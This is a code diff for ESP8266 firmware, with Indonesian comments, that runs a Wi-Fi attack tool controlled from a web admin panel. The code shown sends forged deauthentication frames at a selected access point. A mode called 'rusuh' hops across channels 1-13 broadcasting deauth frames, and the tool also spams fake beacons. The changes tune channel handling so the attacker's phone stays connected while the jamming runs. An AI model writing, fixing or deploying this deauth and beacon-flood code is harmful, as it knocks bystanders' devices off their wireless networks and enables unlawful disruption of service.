@@ -18,7 +18,7 @@ bool attack_all = false;
 String selected_bssid = ""; 
 String selected_ssid = "";
 uint8_t target_ch = 1;
-uint8_t admin_ch = 1; // Pengunci channel admin
+uint8_t admin_ch = 1; // KUNCI UTAMA DISINI
 
 ESP8266WebServer server(80);
 DNSServer dnsServer;
@@ -36,11 +36,9 @@ uint8_t beaconPacket[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x
 void sendDeauth(String bssid_str) {
   uint8_t bssid[6];
   for (int i = 0; i < 6; i++) bssid[i] = strtol(bssid_str.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
-  
   uint8_t macAddr[6];
   WiFi.softAPmacAddress(macAddr);
   if (memcmp(bssid, macAddr, 6) == 0) return;
-
   memcpy(&deauthPacket[10], bssid, 6);
   memcpy(&deauthPacket[16], bssid, 6);
   wifi_send_pkt_freedom(deauthPacket, 26, 0);
@@ -56,7 +54,7 @@ void spamBeacon() {
   }
 }
 
-// ================= UI ADMIN (SESUAI SS LU) =================
+// ================= UI ADMIN =================
 const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GMpro87 - Admin Panel</title>
 <style>
@@ -152,9 +150,15 @@ String processor(const String& var) {
 
 void setup() {
   Serial.begin(115200); LittleFS.begin();
+  
+  // STEP FIX: Bersihin radio dulu
+  WiFi.disconnect();
+  WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
-  admin_ch = WiFi.channel(); // Lock channel admin pas awal
+  
+  // PAKSA CHANNEL 1 BIAR STABIL
+  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1); 
+  admin_ch = 1;
   
   dnsServer.start(53, "*", WiFi.softAPIP());
 
@@ -166,7 +170,12 @@ void setup() {
     server.send(200, "text/html", html);
   });
 
-  server.on("/scan", []() { wifi_promiscuous_enable(0); WiFi.scanNetworks(true, true); server.sendHeader("Location", "/"); server.send(302); });
+  server.on("/scan", []() { 
+    wifi_promiscuous_enable(0); // Matikan deauth pas lagi scan
+    WiFi.scanNetworks(true, true); 
+    server.sendHeader("Location", "/"); 
+    server.send(302); 
+  });
 
   server.on("/attack", []() {
     String t = server.arg("type");
@@ -185,8 +194,8 @@ void setup() {
   server.on("/deselect", []() { selected_bssid = ""; selected_ssid = ""; deauth_running = false; server.sendHeader("Location", "/"); server.send(302); });
   server.on("/save", HTTP_POST, []() {
     admin_ssid = server.arg("adm_ssid"); admin_pass = server.arg("adm_pass");
-    beacon_count = server.arg("b_count").toInt(); WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
-    admin_ch = WiFi.channel();
+    beacon_count = server.arg("b_count").toInt(); 
+    WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1);
     server.sendHeader("Location", "/"); server.send(302);
   });
 
@@ -204,19 +213,19 @@ void loop() {
     wifi_set_channel(target_ch);
     sendDeauth(selected_bssid);
     yield();
-    wifi_set_channel(admin_ch); // BALIK KE CHANNEL ADMIN SEGERA
+    wifi_set_channel(admin_ch); // Langsung balik ke channel admin biar HP gak putus
   }
   
   if (rusuh_mode || attack_all) {
     static unsigned long last_hop = 0;
-    if (millis() - last_hop > 150) { // Jeda biar WebServer gak mati
+    if (millis() - last_hop > 150) { 
       static uint8_t ch = 1;
       wifi_set_channel(ch);
       sendDeauth("FF:FF:FF:FF:FF:FF");
       ch++; if (ch > 13) ch = 1;
       last_hop = millis();
       yield();
-      wifi_set_channel(admin_ch); // BALIK KE CHANNEL ADMIN SEGERA
+      wifi_set_channel(admin_ch); // Balik lagi ke admin
     }
   }
   
